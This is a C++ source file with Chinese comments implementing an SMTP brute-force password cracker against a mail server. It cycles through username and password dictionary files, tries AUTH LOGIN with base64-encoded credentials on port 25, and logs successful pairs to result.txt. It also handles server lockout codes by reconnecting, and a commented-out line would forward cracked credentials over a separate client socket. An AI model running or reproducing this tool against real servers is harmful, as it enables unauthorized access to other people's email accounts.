#include <iostream>
#include <winsock2.h>
#include "base64.h"
#include "protocol.h"
#include "ClientSocket.h"
using namespace std;

#pragma comment(lib, "ws2_32.lib")

FILE *fpPass, *fpUser, *fpDomain, *fpResult;			// 文件描述符，用户名、密码文件、保存破解文件指针
SOCKET sock;								// 套接字描述符
char send_wait(char *, char *, char);		// 函数声明:发送数据并等待接受响应码
void usage();								// 程序使用说明
void initialsocket();						// 重置连接
struct sockaddr_in destAddr;				// 目的地址

class CClientSocket;

int smtp_bruteforce()
{
	WSADATA wsaData;			
	DWORD starttime;						// 程序运行的起始时间
	struct hostent *host;					// 域名转换

	char *userFile = "user.txt";			// 用户名字典文件
	char *passFile = "password.txt"; 		// 密码字典文件路径
	char *domainFile = "maildomain.txt";	// 邮件域名列表
	char *resultFile = "result.txt";		// 保存破解结果的文件

	char username[21];						// 用户名
	char password[21];						// 密码
	char mailDomain[51];					// 邮件服务器域名

	int k = 0, i = 0, j = 0;				// 已读取密码文件行数
	char *ICMP_DEST_IP = "mail.starnight.com";						// DNS查询到的IP地址

	
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		printf("套接字版本协商出错!\n");
		WSACleanup();
		return 5;
	}
	
	// 域名解析, 获取邮件服务器IP地址
	host = gethostbyname(ICMP_DEST_IP);
	if(NULL == host)
	{
		printf("无法解析主机%s的IP地址!\n", ICMP_DEST_IP);
		WSACleanup();
		return 6;
	} 
	else		// 使用获取到的第一个IP地址
	{
		ICMP_DEST_IP = inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
		printf("server ip : %s\n", ICMP_DEST_IP);
	}
	
	// 填写目的地址结构体: 协议、地址、端口  SMTP:25
	memset(&destAddr, 0, sizeof(destAddr));
	destAddr.sin_family = AF_INET;
	destAddr.sin_addr.s_addr = inet_addr(ICMP_DEST_IP);  
	destAddr.sin_port = htons(25);
	
	// 以只读打开用户名、密码文件、破解成功的结果	
	fpUser = fopen(userFile, "r");
	fpDomain = fopen(domainFile, "r");
	fpResult = fopen(resultFile, "w+");


	if(NULL == fpUser || NULL == fpDomain || NULL == fpResult)
	{
		printf("open file failed, check whether these files exist : user.txt, password.txt, maildomin.txt\n");
		return -1;
	}

	initialsocket();					// 初始化socket连接
	starttime = GetTickCount();			// 获取当前偏移时间

//	fgets(mailDomain, 50, fpDomain);

	memset(username, 0, sizeof(username));
	while(fgets(username, 20, fpUser))
	{
		j++;
		if(username[strlen(username)-1]==0x0A)
			username[strlen(username)-1]=0;

		memset(password, 0, sizeof(password));
		fpPass = fopen(passFile, "r");					// 重新打开文件
		while (fgets(password, 20, fpPass))
		{
			k++;
			if(password[strlen(password)-1]==0x0A)
				password[strlen(password)-1]=0;
			printf("%d:%d username:%s \t password:%s\n", j, k, username, password);

			//发送AUTH LOGIN命令,并起到接收响应码334
			if(send_wait("AUTH LOGIN", "334", 0) != 2)
				continue;

			if(send_wait(username, "334", 1) != 2)
				continue;

			if(send_wait(password, "235", 1) != 2)
				continue;
			else
			{
				printf("------------ find a pair ---------------\n");
				printf("username:%s \t password:%s\n", username, password);
				printf("----------------------------------------\n");

				int length = strlen(username) + strlen(password);
				char *info = new char[length + 2];
				memset(info, 0, length + 2);
				strncpy(info, username, strlen(username));
				strcat(info, ":");
				strcat(info, password);
				info[length+1] = '\0';
				fwrite(info, length + 1, 1, fpResult);
				fputc('\n', fpResult);
				//fclose(fpResult);
// 				CPacket packet(PACKET_COMMAND, HOST_HELLO, (LPBYTE)info, strlen(info));
// 				cs.Send();
				
				// 发送quit消息，退出登录状态，再初始化连接
				if(send_wait("QUIT", "221", 0) != 2)
					printf("disconnected failed!!!\n");
				else
					printf("disconnected from remote mail server...\n");
				initialsocket();
		
				memset(username, 0, sizeof(username));
				fclose(fpPass);	
				break;						
			}
		}
	}

	// 输出程序运行时间，关闭打开的文件，关闭套接字，做最后的清除工作
	printf("程序运行耗时:%ds:%dms\n", ((GetTickCount()-starttime)) / 1000, ((GetTickCount()-starttime)) % 1000 );
	fclose(fpUser);
	fclose(fpDomain);
	fclose(fpResult);
	closesocket(sock);
	WSACleanup();

	return 0;
}


/**
** 发送数据并等待接受响应码
** 参数说明: command: 发送的命令、 responseCode: 期待接受的响应码、 isEncode: 是否需要base64编码(1表示需要,0表示不需要)
** 返回值: -1:发送失败、 0:接收数据出错、 1:没有成功接收到响应码 、 2:成功接收到响应码	
*/
char send_wait(char *command, char *responseCode, char isEncode)
{
//	unsigned char *base64;
	char smtp_data[101];			// 提交给SMTP服务器的数据
	char recvBuf[201];				// 接收数据缓冲区
	DWORD starttime;				// 开始时间
	memset(smtp_data, 0, sizeof(smtp_data));
	if(isEncode)		// 需要进行base64编码
	{
		std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>((string(command).c_str())), string(command).length());
		printf("encode : %s\n", encoded.c_str());
		strcpy(smtp_data, encoded.c_str());
	} else
	{
		strcpy(smtp_data, command);
	}
	
	// 加上换行符
	smtp_data[strlen(smtp_data)] = 0x0D;
	smtp_data[strlen(smtp_data)] = 0x0A;

	if(SOCKET_ERROR == send(sock, smtp_data, strlen(smtp_data), 0))
	{
		printf("发送请求出错!\n");
		return -1;
	}
	memset(recvBuf, 0, sizeof(recvBuf));
	starttime = GetTickCount();
	while(1)
	{
		// 设置2s的超时时间
		if(GetTickCount() - starttime > 2000)
		{
			printf("timeout...\n");
			return 0;
		}
		
		if(SOCKET_ERROR == recv(sock, recvBuf, 200, 0))
		{
			printf("接收信息出错");
			return 0;
		}
		else 
		{
			printf("recvBuf:==# %s \n", recvBuf);
			if(NULL == strstr(recvBuf, responseCode))
			{
				if(strstr(recvBuf, "421") || strstr(recvBuf, "451"))
					initialsocket();			// 重置socket连接
				return 1;
			}
			else 
				return 2;
		}
	}
}


void initialsocket()
{
	char recvBuf[201];			// 接收服务器返回数据缓冲区
	int timeout = 3000;
	closesocket(sock);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);			// 创建套接字
	if(INVALID_SOCKET == sock)
	{
		printf("创建套接字出错!\n");
		WSACleanup();
		exit(0);
	}
	
	// 连接目标主机
	if(SOCKET_ERROR == connect(sock, (SOCKADDR*)&destAddr, sizeof(destAddr)))
	{
		printf("连接目标主机失败!.\n");
		closesocket(sock);
		WSACleanup();
		exit(0);
	}
	
	// 设置超时时间
	if(SOCKET_ERROR == setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)))
	{
		printf("设置套接字超时失败!.\n");
		closesocket(sock);
		WSACleanup();
		exit(0);
	}
	
	memset(recvBuf, 0, sizeof(recvBuf));
	if(SOCKET_ERROR == recv(sock, recvBuf, 200, 0))
	{
		printf("接收连接信息出错!.\n");
		closesocket(sock);
		WSACleanup();
		exit(0);
	}
	else {
		if(strstr(recvBuf, "554"))
		{
			printf("该服务器有防暴力破解设置，您的IP地址被临时禁制连接，请稍后再试...\n");
			printf("From SMTP Server : \n%s\n", recvBuf);
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
	}
	// 发送"EHLO starnight.com"命令，并期待接收响应码250
	send_wait("EHLO mail.starnight.com", "250", 0);
}


